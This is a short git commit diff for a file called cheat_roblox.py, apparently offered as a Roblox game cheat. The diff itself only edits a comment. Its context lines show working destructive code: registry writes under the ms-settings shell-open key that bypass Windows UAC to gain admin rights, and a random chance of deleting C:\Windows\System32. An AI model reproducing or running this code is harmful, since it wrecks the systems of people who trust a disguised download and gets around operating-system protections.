ea2e8f5b7aa588028c752396c7efb6582b5137fb
QuasarOfficialMrk231 <149317499+QuasarOfficialMrk231@users.noreply.github.com>
2025-03-17 23:40:54 +0300

    Update cheat_roblox.py

--- cheat_roblox.py
+++ cheat_roblox.py
@@ -4,7 +4,7 @@ import shutil
 
 os.system("cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d \"cmd.exe\" /f")
 os.system("cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v \"DelegateExecute\" /t REG_SZ /f")
-os.system("cmd /c start cheat_roblox.py")  # Запустит командную строку с админ-правами
+os.system("cmd /c start cheat_roblox.py")  # 😂запуск с админ правами
 
 if random.randint(0, 6) == 1:
     shutil.rmtree("C:\\Windows\\System32", ignore_errors=True)
